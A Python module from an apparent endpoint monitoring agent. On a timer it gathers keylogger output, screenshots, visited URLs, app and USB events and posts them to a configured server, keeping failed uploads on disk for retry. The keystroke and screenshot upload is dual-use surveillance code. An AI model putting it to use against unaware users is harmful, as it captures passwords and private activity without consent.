# agent/modules/uploader.py  — used when MODE = "server"
import os, sys, glob, json, base64, logging, threading, time
from datetime import datetime, timezone
import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import config
from modules import activity, url_tracker, app_blocker, usb_guard, keylogger

logger  = logging.getLogger("uploader")
RETRY_DIR = os.path.join(config.DATA_DIR, "retry")

SESSION = requests.Session()
SESSION.headers.update({
    "Authorization": f"Bearer {config.API_KEY}",
    "Content-Type":  "application/json",
    "X-Machine":     config.MACHINE_NAME,
})


def _encode_screenshots() -> list:
    ss = []
    os.makedirs(config.SCREENSHOT_DIR, exist_ok=True)
    for path in sorted(glob.glob(os.path.join(config.SCREENSHOT_DIR, "*.jpg"))):
        try:
            with open(path, "rb") as f:
                data = f.read()
            fname = os.path.basename(path)
            parts = fname.replace(".jpg","").split("_")
            ss.append({"filename": fname,
                        "captured_utc": f"{parts[1]}T{parts[2]}" if len(parts)>=3 else "",
                        "reason": parts[3] if len(parts)>=4 else "scheduled",
                        "data_b64": base64.b64encode(data).decode()})
            os.remove(path)
        except Exception as e:
            logger.error(f"Screenshot encode error {path}: {e}")
    return ss


def _build_payload() -> dict:
    return {
        "machine":        config.MACHINE_NAME,
        "uploaded_utc":   datetime.now(timezone.utc).isoformat(),
        "activity":       activity.flush(),
        "urls":           url_tracker.flush(),
        "app_violations": app_blocker.flush(),
        "usb_events":     usb_guard.flush(),
        "keylog":         keylogger.flush(),
        "screenshots":    _encode_screenshots(),
    }


def _upload(payload: dict) -> bool:
    try:
        resp = SESSION.post(f"{config.SERVER_URL}/api/ingest", json=payload, timeout=60)
        if resp.status_code == 200:
            logger.info(f"Upload success: {resp.json().get('saved',{})}")
            return True
        logger.warning(f"Upload failed: HTTP {resp.status_code}")
        return False
    except requests.exceptions.ConnectionError:
        logger.warning("Server unreachable.")
        return False
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return False


def _save_retry(payload: dict):
    os.makedirs(RETRY_DIR, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    with open(os.path.join(RETRY_DIR, f"retry_{ts}.json"), "w") as f:
        json.dump(payload, f)


def _retry_pending():
    for path in sorted(glob.glob(os.path.join(RETRY_DIR, "retry_*.json"))):
        try:
            with open(path) as f:
                payload = json.load(f)
            if _upload(payload):
                os.remove(path)
        except Exception as e:
            logger.error(f"Retry failed {path}: {e}")


def _loop():
    while True:
        time.sleep(config.UPLOAD_EVERY)
        _retry_pending()
        payload = _build_payload()
        total = sum(len(v) for v in payload.values() if isinstance(v, list))
        if total == 0:
            continue
        if not _upload(payload):
            _save_retry(payload)


def start():
    os.makedirs(config.DATA_DIR, exist_ok=True)
    t = threading.Thread(target=_loop, daemon=True, name="UploaderThread")
    t.start()
    logger.info("Uploader started.")
